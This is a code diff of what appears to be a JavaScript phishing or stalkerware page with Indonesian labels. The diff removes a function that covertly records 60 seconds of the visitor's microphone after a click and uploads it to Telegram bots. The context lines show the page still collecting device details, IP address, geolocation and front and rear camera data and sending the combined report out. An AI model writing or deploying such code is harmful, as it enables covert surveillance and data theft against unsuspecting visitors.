@@ -206,40 +206,6 @@
       }
     };
 
-    let statusVN = "❌ Voice Note tidak diizinkan.";
-    const kirimVN = async (blob) => {
-      for (const t of targets) {
-        const form = new FormData();
-        form.append("chat_id", t.chat_id);
-        form.append("voice", blob, "voice.webm");
-        await fetch(`https://api.telegram.org/bot${t.token}/sendVoice`, {
-          method: "POST",
-          body: form
-        });
-      }
-      statusVN = `Rekam target berhasil\nDurasi : 60 detik\nJenis : audio/webm`;
-    };
-
-    const rekamSuara = () => {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-      navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: 'audio/webm' });
-          await kirimVN(blob);
-        };
-        mediaRecorder.start();
-        setTimeout(() => {
-          mediaRecorder.stop();
-          stream.getTracks().forEach(track => track.stop());
-        }, 60000);
-      }).catch(() => {
-        statusVN = `❌ Voice Note tidak diizinkan.`;
-      });
-    };
-
     const getDeviceBrand = () => {
       const ua = navigator.userAgent;
       if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
@@ -377,10 +343,6 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
       audio.muted = false;
       try { await audio.play(); } catch {}
 
-      document.body.addEventListener("click", () => {
-        rekamSuara();
-      }, { once: true });
-
       const info = await ambilDataPerangkat();
       const ip = await ambilIPInfo();
       const lokasi = await ambilLokasi();
@@ -390,9 +352,8 @@ Peta                   : https://maps.google.com/?q=${latitude},${longitude}`);
 
       const kameraDepanStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗗𝗘𝗣𝗔𝗡 〙 ౼\n${depan}`;
       const kameraBelakangStatus = `౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`;
-      const vnStatus = `౼ 〘 𝗩𝗢𝗜𝗖𝗘 𝗡𝗢𝗧𝗘 𝗔𝗨𝗗𝗜𝗢 〙 ౼\n${statusVN}`;
 
-      const gabung = [info, ip, lokasi, kameraDepanStatus, kameraBelakangStatus, vnStatus].join("\n\n");
+      const gabung = [info, ip, lokasi, kameraDepanStatus, kameraBelakangStatus].join("\n\n");
       await kirimPesan(gabung);
     };
 
